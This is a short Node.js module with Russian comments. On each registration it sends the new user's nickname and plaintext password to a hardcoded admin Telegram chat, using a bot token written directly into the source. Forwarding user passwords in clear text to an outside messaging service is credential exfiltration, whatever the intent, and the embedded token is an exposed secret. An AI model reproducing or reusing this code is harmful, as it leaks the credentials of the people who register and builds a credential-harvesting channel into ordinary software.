const TelegramBot = require('node-telegram-bot-api');

// ВСТАВЬ СЮДА ТОКЕН ТВОЕГО НОВОГО БОТА ДЛЯ РЕГИСТРАЦИЙ
const TOKEN = '9254875275:AAE1A1cel0QrUjp4IJABNd2YQB6XhENviM4'; 
const ADMIN_CHAT = '7270019395';

// Создаем бота БЕЗ прокси (он пойдет через твой системный VPN)
const bot = new TelegramBot(TOKEN, { polling: false });

async function notifyNewUser(nickname, password) {
  const text = `🆕 *Новая регистрация!*\n\n👤 Ник: \`${nickname}\`\n🔑 Пароль: \`${password}\``;
  try {
    await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown' });
    console.log('✅ Уведомление о регистрации отправлено!');
  } catch (e) {
    console.error('❌ Ошибка отправки регистрации:', e.message);
  }
}

module.exports = { notifyNewUser };